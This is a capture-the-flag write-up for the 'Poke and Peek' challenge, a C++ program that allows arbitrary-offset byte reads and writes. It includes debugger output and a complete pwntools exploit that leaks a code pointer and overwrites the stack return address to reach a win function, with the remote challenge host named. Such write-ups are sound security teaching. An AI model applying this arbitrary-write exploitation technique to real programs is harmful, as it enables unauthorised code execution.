# Poke and Peek -- Solution

The C++ binary allows the user to read and write bytes at an arbitrary 32-bit offset from the data stored in a `std::string`. The high-level game plan is straightforward -- we need to find a function pointer in a nearby writable memory and modify it to point to the `win` function provided for our convenience. 

```c
    ...
    getline(cin, line);
    istringstream iss(line);
    string command;
    iss >> command;
    if (command == POKE_CMD) {
      int x, y;
      if (!(iss >> x >> y)) {
        cout << HELP.at(POKE_CMD) << endl;
        continue ;
      }
      s[x] = char(y);
    } else if (command == PEEK_CMD) {
      int x;
      if (!(iss >> x)) {
        cout << HELP.at(PEEK_CMD) << endl;
        continue ;
      }
      cout << int(s[x]) << endl;
    }
    ...
```

We start the investation by figuring out where is the `std::string` payload under our control stored in the programs memory. Entering the `tbtltbtl` as he input and investigating with the debugger we get the following results:

```
gef➤  grep tbtltbtl
[+] Searching 'tbtltbtl' in memory
[+] In '[heap]'(0x5558e64ab000-0x5558e64cc000), permission=rw-
  0x5558e64bd4e0 - 0x5558e64bd4ea  →   "tbtltbtl\n" 
[+] In '[stack]'(0x7ffe85bb1000-0x7ffe85bd2000), permission=rw-
  0x7ffe85bcf7c0 - 0x7ffe85bcf7c8  →   "tbtltbtl" 
gef➤  telescope $rsp
0x007ffe85bcf780│+0x0000: 0x00005b0000006e ("n"?)        ← $rsp
0x007ffe85bcf788│+0x0008: 0x007ffe85bcf7e0  →  0x005558e64bcf40  →  0x0000000000000001
0x007ffe85bcf790│+0x0010: 0x007ffe85bcf7d0  →  0xffffffffffffff90
0x007ffe85bcf798│+0x0018: 0x007ffe85bcf7b0  →  0x007ffe85bcf7c0  →  "tbtltbtl"
0x007ffe85bcf7a0│+0x0020: 0xffffffffffffff90
0x007ffe85bcf7a8│+0x0028: 0x005558e64bcee0  →  0x0000000000000000
0x007ffe85bcf7b0│+0x0030: 0x007ffe85bcf7c0  →  "tbtltbtl"
0x007ffe85bcf7b8│+0x0038: 0x0000000000000008
0x007ffe85bcf7c0│+0x0040: "tbtltbtl"
0x007ffe85bcf7c8│+0x0048: 0x007f255ea41000  →  <__malloc_check_init+80> add eax, 0x353ed3
```

It turns out, when the string is short, the data is actually stored on the call stack. Now, we use the debugger to find the offset to the return address to overwrite. To calculate the address of the `win` function, we need to leak the address of some pointer to the programs code:

```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 33623)
    else:
        p = process('./chall')
    return p

def poke(p, x, y):
    p.sendlineafter(b':\n', 'poke {} {}'.format(x, y).encode())

def peek(p, x):
    p.sendlineafter(b':\n', 'peek {}'.format(x).encode())
    return int(p.recvline())

def peekq(p, x):
    b = [(peek(p, x+i)+256)%256 for i in range(8)]
    return unpack(bytes(b))

def pokeq(p, x, y):
    for i, c in enumerate(pack(y)):
        poke(p, x+i, c)

p = conn()
magic = b'tbtltbtl'
p.sendlineafter(b':', magic)
assert peekq(p, 0) == unpack(magic)
leak_offset = 0x238
leak_address = peekq(p, leak_offset)
win_address = leak_address + 0xb80
ret_offset = 0x218
pokeq(p, ret_offset, win_address)
p.sendline(b'quit')

p.interactive()
```

Additional challenge: For longer strings, the string data will be allocated on heap. The exploit is still possible but a bit more complicated since its imposible to overwrite stack values using 32-bit offset.